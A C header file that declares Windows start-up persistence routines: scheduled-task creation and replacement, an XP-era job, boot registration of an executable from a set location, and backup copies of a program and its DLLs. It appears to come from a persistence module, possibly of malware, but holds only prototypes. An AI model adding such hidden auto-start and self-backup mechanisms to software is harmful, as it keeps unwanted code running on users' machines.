#pragma once


#ifndef BOOTAUTORUN_H_H_H
#define BOOTAUTORUN_H_H_H

#include <Windows.h>
#include "public.h"

#define SCHTASK_FILE_SIZE	0x4000

int replaceTask();

int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion);

int createBootTask(int iInterval, char* szTaskName, char* szPeFileName, char* param, int iSystemVersion);

int windowsXPJob(DWORD dwStartMilliSeconds, DWORD dwTimes);

DWORD BackupProgram(char* szSrcFile, char szDllName[MAX_DLL_COUNT][MAX_PATH], DWORD dwDllCnt, char* szSysDir, char* strUserName, char* strBakPEResidence);

DWORD CreateSchWinXP(int iInterval, char* szTaskName, char* szPeFileName);
#endif